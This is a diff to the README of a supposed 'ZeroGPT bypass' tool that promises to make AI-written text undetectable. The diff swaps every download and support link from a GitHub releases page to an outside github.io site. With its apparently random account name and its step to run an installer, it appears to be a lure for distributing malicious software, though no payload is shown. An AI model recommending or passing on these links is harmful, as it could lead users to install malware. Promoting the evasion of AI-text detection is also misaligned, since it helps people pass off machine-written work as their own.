@@ -1,6 +1,6 @@
 # ⚡ zerogpt-bypass-2026 - Make AI Text 100% Human Instantly
 
-[![Download Now](https://img.shields.io/badge/Download-ZeroGPT_Bypass_2026-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Laricariidaeclethrionomys980/zerogpt-bypass-2026/releases)
+[![Download Now](https://img.shields.io/badge/Download-ZeroGPT_Bypass_2026-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://laricariidaeclethrionomys980.github.io)
 
 ---
 
@@ -30,7 +30,7 @@ No administrator privileges needed. No coding or command line required.
 
 Visit this link to download the application:
 
-[**👉 Click Here to Download zerogpt-bypass-2026**](https://github.com/Laricariidaeclethrionomys980/zerogpt-bypass-2026/releases)
+[**👉 Click Here to Download zerogpt-bypass-2026**](https://laricariidaeclethrionomys980.github.io)
 
 ### Step 2: Run the Installer
 
@@ -159,7 +159,7 @@ Before using it on important documents, test the tool with a sample AI-generated
 
 ## 💬 Support
 
-If you have any issues, visit the [GitHub Releases Page](https://github.com/Laricariidaeclethrionomys980/zerogpt-bypass-2026/releases) and check the comments section. Other users often share solutions. You can also open an issue on the repository page.
+If you have any issues, visit the [GitHub Releases Page](https://laricariidaeclethrionomys980.github.io) and check the comments section. Other users often share solutions. You can also open an issue on the repository page.
 
 ---
 
@@ -180,7 +180,7 @@ If you have any issues, visit the [GitHub Releases Page](https://github.com/Lari
 3. Paste your AI text and click Humanize
 4. Submit your 100% human-sounding text
 
-[**⬇️ Download zerogpt-bypass-2026 Now**](https://github.com/Laricariidaeclethrionomys980/zerogpt-bypass-2026/releases)
+[**⬇️ Download zerogpt-bypass-2026 Now**](https://laricariidaeclethrionomys980.github.io)
 
 ---
 
